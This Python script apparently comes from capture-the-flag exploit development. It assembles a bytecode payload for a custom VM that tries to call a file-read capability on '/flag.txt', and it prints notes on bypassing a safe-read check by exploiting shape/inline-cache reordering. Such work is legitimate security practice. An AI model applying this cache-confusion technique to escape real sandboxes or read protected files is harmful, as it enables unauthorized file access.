import struct

def p8(x): return struct.pack('<B', x)
def p16(x): return struct.pack('<H', x)

# Constants
consts = [
    b"caps",                    # 0
    b"/flag.txt",               # 1
]

payload = b""
# Header: [nr_regs] [cs_count]
payload += p8(0x10)  # 16 registers
payload += p8(len(consts))

# Constants Definitions
for c in consts:
    payload += p8(0x02)      # Type: String
    payload += p16(len(c))   # Length
    payload += c             # Bytes

# Bytecode - Simple test: Load caps and return
code = b""

# r0 = global["caps"] (LOADG)
code += p8(0x02) + p8(0x00) + p8(0x00)

# r1 = r0.c (GETPROP)  - Should get F7
code += p8(0x20) + p8(0x01) + p8(0x00) + p8(0x03)

# r2 = r1.e (GETPROPC with cache) - Should walk up to F5 and get F1
code += p8(0x21) + p8(0x02) + p8(0x06) + p8(0x01) + p8(0x0a)

# r3 = const[1] = "/flag.txt"
code += p8(0x01) + p8(0x03) + p8(0x01)

# r4 = r2(r3) - Call F1("/flag.txt") - but F1 requires relative path!
code += p8(0x30) + p8(0x04) + p8(0x02) + p8(0x01) + p8(0x01) + p8(0x03)

# RET r4
code += p8(0x31) + p8(0x04)

payload += code

hex_payload = payload.hex()
print(f"Simple test payload: {hex_payload}")
print(f"Payload length: {len(payload)} bytes")

# Analyze it
print("\n=== Payload Breakdown ===")
print(f"Header: nr_regs=0x10 (16), cs_count={len(consts)}")
print(f"Constants:")
for i, c in enumerate(consts):
    print(f"  [{i}] {c}")
print(f"\nBytecode:")
print("  LOADG r0, global['caps']")
print("  GETPROP r1, r0.c")
print("  GETPROPC r2, r1.e (PC=6)")
print("  LOADK r3, const[1]")
print("  CALL r4, r2(r3)")
print("  RET r4")

# Now test the original exploit logic more carefully
print("\n\n=== Original Exploit Analysis ===")
print("The issue: F1 (safe read) checks if path is absolute and rejects it")
print("F0 (unsafe read) allows absolute paths")
print("\nObject structure:")
print("F5.storage = [F1, F0]  # key e=10 at index 0, key 0 at index 1")
print("F5.shape.map = {10: 0, 0: 1}")
print("\nAfter SORT on key 'e':")
print("F5 keys sorted: [0, 10]")
print("F5.storage = [F0, F1]  # storage reordered!")
print("F5.shape.map = {0: 0, 10: 1}  # map updated")
print("\nBUT: shape versioning should invalidate cache...")
print("Unless the shape transition happens WITHOUT version increment?")
